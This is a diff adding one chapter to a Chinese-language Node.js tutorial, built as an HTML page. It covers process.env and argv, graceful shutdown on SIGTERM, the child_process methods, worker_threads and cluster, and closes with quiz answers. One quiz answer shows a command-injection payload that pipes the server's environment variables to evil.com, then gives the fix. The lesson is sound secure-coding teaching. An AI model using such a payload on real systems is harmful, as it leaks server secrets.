@@ -1,0 +1,243 @@
+<!-- ====================================================================
+     PART 06: 进程与线程 · process 生命周期、child_process 与 worker_threads
+     ==================================================================== -->
+<div class="wb-sec-header periwinkle" id="process">
+  <span class="wb-sec-num">06</span>
+  <span class="wb-sec-title">进程与线程：process 生命周期、child_process 与 worker_threads</span>
+  <span class="plop-tag tomato">PROCESS × CHILD_PROCESS × WORKER_THREADS × CLUSTER</span>
+</div>
+
+<div class="plop-callout tip" style="margin-bottom:18px;">
+  <strong><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-target"></use></svg> 学完本章你能做什么：</strong>用全局 <code>process</code> 管理配置与优雅停机信号，按输出特征安全选用 <code>child_process</code> 四种方法调用外部程序（杜绝命令注入），并分清何时用 <code>worker_threads</code> 卸载重计算、何时用 <code>cluster</code> 跑满多核 CPU。
+</div>
+
+<!-- 06.1 · 命令行参数、.env 环境变量与优雅停机信号 -->
+<div class="wb-card" id="process-env-basic" style="background:var(--plop-paper); margin-bottom:20px;">
+  <div class="washi-tape"></div>
+  <div class="chapter-q-pill"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cog"></use></svg> 06.1 · 进程控制与配置：<code>process.env</code> 环境变量、<code>process.argv</code> 与优雅停机信号监听</div>
+  <h3 id="cluster"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cog"></use></svg> 06.1 读取环境变量（<code>process.env</code>）、命令行参数与优雅停机</h3>
+
+  <p>
+    每个运行中的 Node.js 程序都是操作系统里的一个进程，拥有唯一的 <strong>PID（Process Identifier，进程标识符，<code>process.pid</code>）</strong>。全局对象 <strong><code>process</code></strong> 提供了读取启动配置与控制当前进程生命周期的全部能力：
+  </p>
+  <ul style="margin:0 0 12px; padding-left:20px; font-size:13.6px; line-height:1.7;">
+    <li><strong><code>process.env</code>（环境变量字典）</strong>：数据库密码、密钥和端口统一从这里读取（本地开发配合第 01 章的 <code>node --env-file=.env</code> 加载，线上由 Docker / Kubernetes 直接注入）；</li>
+    <li><strong><code>process.argv</code>（命令行参数数组）</strong>：前两项固定为 Node 可执行文件路径与当前脚本路径，用户传入的额外参数从 <strong><code>process.argv.slice(2)</code></strong> 开始获取；</li>
+    <li><strong>监听退出信号（<code>SIGTERM / SIGINT</code>）</strong>：终端按下 <code>Ctrl + C</code> 会发送 <code>SIGINT</code>，Docker / Kubernetes 滚动发版销毁旧容器前会先发送 <strong><code>SIGTERM</code></strong>——监听它们先停接新请求、等存量请求写完库再退出，就能避免用户发版瞬间看到 <code>502 Bad Gateway</code>。</li>
+  </ul>
+
+  <div class="wb-grid-2">
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-sw-poster"></use></svg> config.mjs · 读取环境变量与命令行参数 [Node.js 20.6+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-env-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-env-basic"><code><span class="c-cm">// 启动示例: node --env-file-if-exists=.env config.mjs --dry-run</span>
+<span class="c-cm">// 注意：process.env 里的值全部是字符串，数字和布尔开关需显式转换</span>
+<span class="c-kw">export const</span> config = {
+  pid: process.pid,
+  nodeEnv: process.env.NODE_ENV || <span class="c-str">'development'</span>,
+  port: <span class="c-fn">Number</span>(process.env.PORT || 3000),
+  dbUrl: process.env.DB_URL || <span class="c-str">'mysql://root:pass@127.0.0.1:3306/app'</span>,
+  args: process.argv.<span class="c-fn">slice</span>(2), <span class="c-cm">// 输出: ['--dry-run']</span>
+};
+console.<span class="c-fn">log</span>(<span class="c-str">`进程 PID=${config.pid}, 监听端口=${config.port}`</span>);</code></pre>
+    </div>
+
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-shield"></use></svg> graceful_exit.mjs · 监听停止信号实现优雅停机 [Node.js 20+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-exit-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-exit-basic"><code><span class="c-kw">export function</span> <span class="c-fn">setupGracefulShutdown</span>(server, onCleanup) {
+  <span class="c-kw">let</span> shuttingDown = <span class="c-kw">false</span>;
+  <span class="c-kw">const</span> <span class="c-fn">shutdown</span> = <span class="c-kw">async</span> (signal) =&gt; {
+    <span class="c-kw">if</span> (shuttingDown) <span class="c-kw">return</span>;
+    shuttingDown = <span class="c-kw">true</span>;
+    console.<span class="c-fn">log</span>(<span class="c-str">`收到 ${signal}，拒收新连接并等待存量请求完成...`</span>);
+
+    <span class="c-cm">// 兜底强退计时器 (.unref() 保证不阻碍正常提前退出)</span>
+    <span class="c-fn">setTimeout</span>(() =&gt; process.<span class="c-fn">exit</span>(1), 10_000).<span class="c-fn">unref</span>();
+
+    server.<span class="c-fn">close</span>(<span class="c-kw">async</span> () =&gt; {
+      <span class="c-kw">if</span> (onCleanup) <span class="c-kw">await</span> <span class="c-fn">onCleanup</span>(); <span class="c-cm">// 关闭 MySQL / Redis 连接池</span>
+      process.<span class="c-fn">exit</span>(0);
+    });
+  };
+  process.<span class="c-fn">on</span>(<span class="c-str">'SIGINT'</span>, () =&gt; <span class="c-fn">shutdown</span>(<span class="c-str">'SIGINT'</span>));
+  process.<span class="c-fn">on</span>(<span class="c-str">'SIGTERM'</span>, () =&gt; <span class="c-fn">shutdown</span>(<span class="c-str">'SIGTERM'</span>));
+}</code></pre>
+    </div>
+  </div>
+</div>
+
+<!-- 06.2 · 调用外部命令与脚本：node:child_process 四种方法选型与实战 -->
+<div class="wb-card" id="child-process-basic" style="background:var(--plop-paper); margin-bottom:20px;">
+  <div class="washi-tape mint"></div>
+  <div class="chapter-q-pill"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cog"></use></svg> 06.2 · 调用外部程序：<code>execFile</code>、<code>spawn</code>、<code>exec</code> 与 <code>fork</code> 四种方法对比与防注入</div>
+  <h3><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cog"></use></svg> 06.2 子进程（<code>node:child_process</code>）：调用外部命令与脚本的四种方法</h3>
+
+  <p>
+    当需要在 Node.js 代码里调用系统上的其他程序（如调 <code>git</code> 查提交号、调 <code>ffmpeg</code> 截图、运行 Python 脚本）时，使用内置的 <strong><code>node:child_process</code></strong> 模块。四个常用方法的核心区别在于<strong>「输出是一次性缓冲返回还是流式返回」</strong>以及<strong>「是否启动 Shell 解释器」</strong>：
+  </p>
+
+  <div class="table-wrap" style="margin-bottom:12px;">
+    <table class="plop-table">
+      <thead>
+        <tr>
+          <th style="width:22%">方法名</th>
+          <th style="width:22%">输出返回方式</th>
+          <th style="width:18%">是否启动 Shell</th>
+          <th>日常适用场景与安全建议</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>1. <code>execFile(file, args)</code></strong><br>（日常调用外部命令首选）</td>
+          <td>等命令执行完，一次性返回完整字符串 / <code>Buffer</code></td>
+          <td><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cross"></use></svg> 否（直接运行程序）</td>
+          <td><strong>适合输出较短的外部命令</strong>。参数以数组形式独立传入，<strong>天然免疫 Shell 命令注入</strong>。</td>
+        </tr>
+        <tr>
+          <td><strong>2. <code>spawn(file, args)</code></strong><br>（长任务 / 大输出首选）</td>
+          <td>通过 <strong><code>stdout</code> 流</strong>实时一块块返回</td>
+          <td><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cross"></use></svg> 否（默认不启动）</td>
+          <td><strong>适合持续运行或输出体积巨大的任务</strong>（如实时读取日志流、<code>ffmpeg</code> 视频转码），不撑内存。</td>
+        </tr>
+        <tr>
+          <td><strong>3. <code>exec(command)</code></strong></td>
+          <td>一次性返回完整结果（默认上限 <code>1MB</code>）</td>
+          <td><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-check"></use></svg> 是（先启动 <code>/bin/sh</code>）</td>
+          <td>支持 Shell 管道符（<code>ls | grep js</code>），但<strong>严禁拼接任何外部用户输入参数</strong>（存在命令注入高危风险）。</td>
+        </tr>
+        <tr>
+          <td><strong>4. <code>fork(script.mjs)</code></strong></td>
+          <td>自带 IPC（Inter-Process Communication，进程间通信）通道</td>
+          <td><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-cross"></use></svg> 否（专用于跑 JS 文件）</td>
+          <td><strong>专门用于派生另一个独立的 Node.js 子进程</strong>，父子进程之间可通过 <code>send() / on('message')</code> 收发消息。</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="wb-grid-2">
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-check"></use></svg> 场景 A：短输出命令用 promisify(execFile) [Node.js 20+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-cp-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-cp-basic"><code><span class="c-kw">import</span> { execFile } <span class="c-kw">from</span> <span class="c-str">'node:child_process'</span>;
+<span class="c-kw">import</span> { promisify } <span class="c-kw">from</span> <span class="c-str">'node:util'</span>;
+
+<span class="c-kw">const</span> execFileAsync = <span class="c-fn">promisify</span>(execFile);
+
+<span class="c-cm">// 参数放在独立数组中传入，不经过 Shell 解析分号或反引号，安全防注入</span>
+<span class="c-kw">const</span> { stdout } = <span class="c-kw">await</span> <span class="c-fn">execFileAsync</span>(<span class="c-str">'node'</span>, [<span class="c-str">'-v'</span>]);
+console.<span class="c-fn">log</span>(<span class="c-str">'子进程读取版本:'</span>, stdout.<span class="c-fn">trim</span>());</code></pre>
+    </div>
+
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-wave"></use></svg> 场景 B：持续输出或大体积结果用 spawn 流式读取 [Node.js 20+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-spawn-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-spawn-basic"><code><span class="c-kw">import</span> { spawn } <span class="c-kw">from</span> <span class="c-str">'node:child_process'</span>;
+
+<span class="c-cm">// 列出当前目录文件详情，每产生一块输出立即流式打印</span>
+<span class="c-kw">const</span> child = <span class="c-fn">spawn</span>(<span class="c-str">'ls'</span>, [<span class="c-str">'-lh'</span>]);
+
+child.stdout.<span class="c-fn">on</span>(<span class="c-str">'data'</span>, (chunk) =&gt; {
+  process.stdout.<span class="c-fn">write</span>(<span class="c-str">`[输出块] ${chunk}`</span>);
+});
+child.<span class="c-fn">on</span>(<span class="c-str">'close'</span>, (code) =&gt; {
+  console.<span class="c-fn">log</span>(<span class="c-str">`子进程结束，退出码: ${code}`</span>);
+});</code></pre>
+    </div>
+  </div>
+</div>
+
+<!-- 06.3 · 利用多核 CPU：worker_threads 工作线程与 cluster 多进程 -->
+<div class="wb-card" id="worker-threads-basic" style="background:var(--plop-paper);">
+  <div class="washi-tape pink"></div>
+  <div class="chapter-q-pill"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-link"></use></svg> 06.3 · 多核并发实战：<code>worker_threads</code> 后台计算线程与 <code>cluster</code> 多进程扩展</div>
+  <h3><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-link"></use></svg> 06.3 用满多核 CPU：<code>worker_threads</code>（算力卸载）与 <code>cluster</code>（多进程服务）</h3>
+
+  <p>
+    默认情况下，一个 Node.js 进程只跑在 <strong>1 颗 CPU 核心</strong>上。在 8 核服务器上想用满硬件资源，要根据瓶颈类型选用对应的内置模块：
+  </p>
+  <ul style="margin:0 0 12px; padding-left:20px; font-size:13.6px; line-height:1.7;">
+    <li><strong>单个接口有耗时 CPU 计算（如生成大报表、解析大文件、复杂哈希）➔ 用 <code>node:worker_threads</code></strong>：在当前进程内部开启一个轻量工作线程专门算数据，算完通过 <code>postMessage</code> 把结果传回主线程，确保主线程事件循环绝不卡顿；</li>
+    <li><strong>想让整个 HTTP 服务跑满多核吞吐量 ➔ 单机用 <code>node:cluster</code> / PM2，容器环境开多副本 Pod</strong>：按 CPU 核数启动多个独立 Worker 进程共同分担同一个端口的网络流量。</li>
+  </ul>
+
+  <div class="wb-grid-2" style="margin-bottom:14px;">
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-link"></use></svg> worker_demo.mjs · 用 worker_threads 把耗时计算移出主线程 [Node.js 20+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-worker-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-worker-basic"><code><span class="c-kw">import</span> { Worker, isMainThread, parentPort, workerData } <span class="c-kw">from</span> <span class="c-str">'node:worker_threads'</span>;
+
+<span class="c-kw">if</span> (isMainThread) {
+  <span class="c-cm">// 【主线程】将自身作为 Worker 脚本启动后台线程，传入初始参数 workerData</span>
+  <span class="c-kw">const</span> worker = <span class="c-kw">new</span> <span class="c-fn">Worker</span>(<span class="c-kw">new</span> <span class="c-fn">URL</span>(<span class="c-kw">import</span>.meta.url), {
+    workerData: { limit: 50_000_000 },
+  });
+  worker.<span class="c-fn">on</span>(<span class="c-str">'message'</span>, (res) =&gt; console.<span class="c-fn">log</span>(<span class="c-str">'后台线程计算结果:'</span>, res));
+  worker.<span class="c-fn">on</span>(<span class="c-str">'error'</span>, (err) =&gt; console.<span class="c-fn">error</span>(<span class="c-str">'Worker 异常:'</span>, err));
+} <span class="c-kw">else</span> {
+  <span class="c-cm">// 【Worker 线程】独立 V8 实例跑重度循环，主线程照常响应 HTTP 请求</span>
+  <span class="c-kw">let</span> sum = 0;
+  <span class="c-kw">for</span> (<span class="c-kw">let</span> i = 1; i &lt;= workerData.limit; i++) sum += i;
+  parentPort.<span class="c-fn">postMessage</span>(sum);
+}</code></pre>
+    </div>
+
+    <div class="plop-code-box">
+      <div class="plop-code-head">
+        <span><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-blocks"></use></svg> cluster_basic.mjs · 按可用并行核数启动多进程共享 8080 端口 [Node.js 20+]</span>
+        <button class="sticker-btn" style="padding:2px 9px; font-size:11px;" onclick="copyText('code-cluster-basic', this)">复制代码</button>
+      </div>
+      <pre class="plop-code-pre" id="code-cluster-basic"><code><span class="c-kw">import</span> cluster <span class="c-kw">from</span> <span class="c-str">'node:cluster'</span>;
+<span class="c-kw">import</span> http <span class="c-kw">from</span> <span class="c-str">'node:http'</span>;
+<span class="c-kw">import</span> os <span class="c-kw">from</span> <span class="c-str">'node:os'</span>;
+
+<span class="c-kw">if</span> (cluster.isPrimary) {
+  <span class="c-cm">// availableParallelism() (Node 19.4+) 会感知容器 cgroup CPU 配额，比 os.cpus().length 更准</span>
+  <span class="c-kw">const</span> count = os.<span class="c-fn">availableParallelism</span>();
+  <span class="c-kw">for</span> (<span class="c-kw">let</span> i = 0; i &lt; count; i++) cluster.<span class="c-fn">fork</span>();
+} <span class="c-kw">else</span> {
+  http.<span class="c-fn">createServer</span>((req, res) =&gt; {
+    res.<span class="c-fn">end</span>(<span class="c-str">`由子进程 PID ${process.pid} 响应\n`</span>);
+  }).<span class="c-fn">listen</span>(8080);
+}</code></pre>
+    </div>
+  </div>
+
+  <div class="plop-callout info" style="margin-bottom:16px;">
+    <strong><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-bulb"></use></svg> 背后的原理：</strong>为什么 8 个子进程同时调用 <code>listen(8080)</code> 不会报端口已被占用（<code>EADDRINUSE</code>）？<code>worker_threads</code> 传 <code>100MB</code> 二进制数据时怎么实现零拷贝过户（<code>transferList</code>）和共享内存（<code>SharedArrayBuffer</code>）？详见 <a href="principles.html#cluster"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-blueprint"></use></svg> 《核心原理篇 · 05 多核并发、Cluster IPC 句柄分发与共享内存》 ↗</a>。
+  </div>
+
+  <h4 id="quiz-06" style="margin:0 0 8px;"><svg class="plop-ico" aria-hidden="true"><use href="#plop-ico-check"></use></svg> 本章即时场景题（先想答案，再点击展开）</h4>
+
+  <details class="plop-drawer">
+    <summary>1. 接口需要根据前端传来的分支名查询 Git 日志，写了 <code>exec(`git log -n 5 ${branchName}`)</code>，有什么安全漏洞？怎么改？</summary>
+    <div class="drawer-body">
+      <p>存在严重的<strong>远程命令注入（Command Injection）漏洞</strong>。因为 <code>exec</code> 会启动 <code>/bin/sh -c</code> 解析整条字符串，攻击者只要传入 <code>main; curl http://evil.com/steal?env=$(env|base64)</code>，分号后面的任意系统命令就会以服务器权限直接执行。修复方法是改用<strong>不启动 Shell 的 <code>execFile('git', ['log', '-n', '5', branchName])</code></strong>，并配合 <code>zod</code> 正则白名单校验 <code>branchName</code> 只允许字母、数字、斜杠与连字符。</p>
+    </div>
+  </details>
+
+  <details class="plop-drawer">
+    <summary>2. 用 <code>cluster</code> 开启了 4 个 Worker 子进程后，把用户登录验证码存在模块全局变量 <code>const codeMap = new Map()</code> 里，为什么用户提交校验时经常报错“验证码不存在”？</summary>
+    <div class="drawer-body">
+      <p><code>cluster</code> 派生出的是 <strong>4 个内存完全隔离的独立操作系统进程</strong>。用户第一次请求“发送验证码”落在了 <code>Worker #1</code> 的内存 <code>Map</code> 里，第二次请求“提交登录”被主进程轮询分发到了 <code>Worker #2</code>，而 <code>Worker #2</code> 的 <code>Map</code> 里根本没有这条记录。多进程或多容器部署时，应用进程本身必须保持<strong>无状态（Stateless）</strong>，凡是跨请求共享的状态（验证码、Session、限流计数）统一存进外部 <strong>Redis</strong>。</p>
+    </div>
+  </details>
+
+  <details class="plop-drawer">
+    <summary>3. 为什么高频触发的计算接口不建议“每来一次请求就现 <code>new Worker()</code> 创建一个新线程，算完销毁”，而应该用线程池（如 <code>piscina</code>）？</summary>
+    <div class="drawer-body">
+      <p>虽然 <code>worker_threads</code> 比新建进程轻量，但每次 <code>new Worker()</code> 依然要在后台初始化一套独立的 V8 Isolate 引擎并重新解析加载脚本模块，单次冷启动开销约需 <code>10~30ms</code> 与数 MB 内存；如果突发涌入 500 个请求同时创建 500 个线程，反而会把 CPU 和内存打爆。生产环境中应预先创建固定数量（通常等于 CPU 核数）的<strong>常驻 Worker 线程池</strong>（直接用社区成熟的 <code>piscina</code> 库），请求来了排进任务队列复用已有线程计算。</p>
+    </div>
+  </details>
+</div>
